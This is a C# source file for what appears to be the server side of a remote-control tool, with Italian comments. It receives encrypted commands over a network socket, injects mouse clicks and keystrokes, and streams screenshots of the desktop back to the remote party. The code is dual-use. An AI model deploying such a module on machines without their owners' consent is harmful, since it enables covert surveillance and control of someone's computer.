using System.Drawing;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using bc.srv.Classes.Comunicator;
using bc.srv.Classes.Image_Classes;

namespace bc.srv.Modules.Desktop
{
    internal class DesktopAgent
    {
        private readonly NetworkStream desktopNetwork;

        private readonly MsgFileManager mfm;
        private readonly MsgManager mm;
        private Size size = SystemInformation.PrimaryMonitorSize;


        public DesktopAgent(NetworkStream ctorStream)
        {
            this.desktopNetwork = ctorStream;
            this.mfm = new MsgFileManager(this.desktopNetwork);
            this.mm = new MsgManager(this.desktopNetwork);
        }

        public void StartDesktopListener()
        {
            var t = new Thread(this.RemoteDesktopListener);
            t.IsBackground = true;
            t.Start();
        }

        private void RemoteDesktopListener()
        {
            //MsgFileManager mfm = new MsgFileManager(desktopNetwork);
            //MsgManager mm = new MsgManager(desktopNetwork);

            var vm = new VirtualMouse();

            while (SrvData.Instance.isConnected)
            {
                Thread.Sleep(10);

                var cmd = this.mm.WaitForEncryMessageRicorsive(10000);

                if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                {
                    var cmdSplit = cmd.Split('|');

                    //SCREEN RES INFO
                    if (cmdSplit[0] == "RESOLUTION")
                    {
                        var msg = string.Format("{0}|{1}", this.size.Width, this.size.Height);

                        this.mm.SendEncryMessage(msg, 10000);
                    }

                    //MOUSE CONTROL
                    if (cmdSplit[0] == "MOUSE")
                    {
                        var t = int.Parse(cmdSplit[1]); // click singolo o doppio
                        var w = int.Parse(cmdSplit[2]);
                        var h = int.Parse(cmdSplit[3]);

                        if (t == 1)
                            vm.MouseClick(w, h);

                        if (t == 2)
                            vm.MouseDoubleCkick(w, h);
                        // -1 == CLICK DESTRO
                        if (t == -1)
                            vm.MouseRightClick(w, h);
                    }

                    //MOUSE CONTROL
                    if (cmdSplit[0] == "KEYBOARD")
                        try
                        {
                            SendKeys.SendWait(cmdSplit[1]);
                        }
                        catch
                        {
                        }

                    // cmd3 = quality cmd1 = width cmd2 = heigh
                    if (cmdSplit[0] == "GET")
                    {
                        var w = int.Parse(cmdSplit[1]);
                        var h = int.Parse(cmdSplit[2]);
                        var q = int.Parse(cmdSplit[3]);

                        this.SendDesktop(w, h, q);
                    }

                    // MESSAGGIO DI CHIUSURA REMOTE DESKTOP
                    if (cmdSplit[0] == "EXIT_DESKTOP")
                        break;
                }
            }

            this.desktopNetwork.Close();

            // RIMUOVO DA LISTA
            if (SrvData.Instance.nsListaCanali.Contains(this.desktopNetwork))
                SrvData.Instance.nsListaCanali.Remove(this.desktopNetwork);
        }


        /// <summary>
        ///     Manda Desktop Preview
        /// </summary>
        private void SendDesktop(int width, int height, int quality)
        {
            //MsgFileManager mfm = new MsgFileManager(desktopNetwork);
            //MsgManager mm = new MsgManager(desktopNetwork);

            var iw = new ImageWorker();
            var dsk = iw.DesktopImage(width, height, quality);

            if (dsk != null)
                this.mfm.SendEncryFileByte(dsk, 10000); // invio il desktop preview            
        }
    }
}